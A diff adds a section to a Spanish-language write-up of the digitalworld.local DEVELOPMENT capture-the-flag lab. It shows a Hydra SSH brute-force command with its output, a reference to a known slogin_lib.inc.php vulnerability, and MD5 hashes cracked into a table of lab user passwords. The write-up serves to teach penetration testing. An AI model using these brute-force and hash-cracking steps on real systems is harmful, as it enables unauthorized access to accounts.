@@ -421,3 +421,83 @@ S-1-5-21-779411179-1483911247-3630892801-1000 DEVELOPMENT\intern (Local User)
 |8080/developmentsecretpage/securitynotice.php| Diccionario de contraseñas|
 |8080/developmentsecretpage/directortestpagev1.php| Revisar HTML |
 |:8080/downloads.html|Revisar HTML, se encuentra un archivo PCAP sin nada importante |
+
+- Cuando intenté una inyección básica identificamos un mensaje de ALERTA sobre la librería SLOGIN_LIB.INC.PHP
+
+<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi5.jpg" width=80% />
+
+<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi6.jpg" width=80% />
+
+> En resumen tenemos: listado de usuarios, un diccionario de credenciales y un mensaje de error de una librería.
+
+
+## 4. Identificando la vulnerabilidad
+
+### 4.1. Cracking ONLINE
+
+- Tenemos usuarios y un diccionario podemos probar un ataque sobre SSH. Se volvió a caer el servidor (a reiniciar).
+
+```
+root@kali:~/DEVI# cat pass.txt 
+password
+Password
+P@ssw0rd
+P@ssw0rd1
+P@ssw0rd2
+P@ssw0rd3
+P@ssw0rd4
+P@ssw0rd5
+P@ssw0rd1...
+P@ssw0rd2...
+P@ssw0rd3...
+P@ssw0rd4...
+P@ssw0rd5...
+root@kali:~/DEVI# hydra -L users.txt -P pass.txt ssh://10.10.10.139
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-03-15 19:12:53
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 117 login tries (l:9/p:13), ~8 tries per task
+[DATA] attacking ssh://10.10.10.139:22/
+[STATUS] 42.00 tries/min, 42 tries in 00:01h, 82 to do in 00:02h, 16 active
+```
+
+<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi7.jpg" width=80% />
+
+
+### 4.2. Librería PHP vulnerable: slogin_lib.inc.php
+
+- EXPLOIT-DB de inmediato muestra información sobre la librería: https://www.exploit-db.com/exploits/7444
+- TIENES QUE LEER la vulnerabilidad. En resumen tiene dos manera de explotar: RFI (Remote File Inclusion) que no funcionó y un archivo por defecto que MILAGROSAMENTE y POR SUERTE estaba allí listo para utilizar (los CTF son asi).
+
+<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi8.jpg" width=80% />
+
+<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi9.jpg" width=80% />
+
+- Claramente son MD5. Vamos a crackearlos: https://hashes.com/en/decrypt/hash
+
+
+<img src="https://github.com/El-Palomo/DIGITALWORLD.LOCAL-DEVELOPMENT/blob/main/devi10.jpg" width=80% />
+
+- Listo ya tenemos credenciales de usuarios. Vamos a ingresar por SSH.
+
+| Usuario | Password |
+| ------------- | ------------- |
+|intern | 12345678900987654321    |
+|patrick | P@ssw0rd25    |
+|qiu | qiu    |
+|admin | NO IDENTIFICADO    |
+
+
+
+
+
+
+
+
+
+
+
+
+
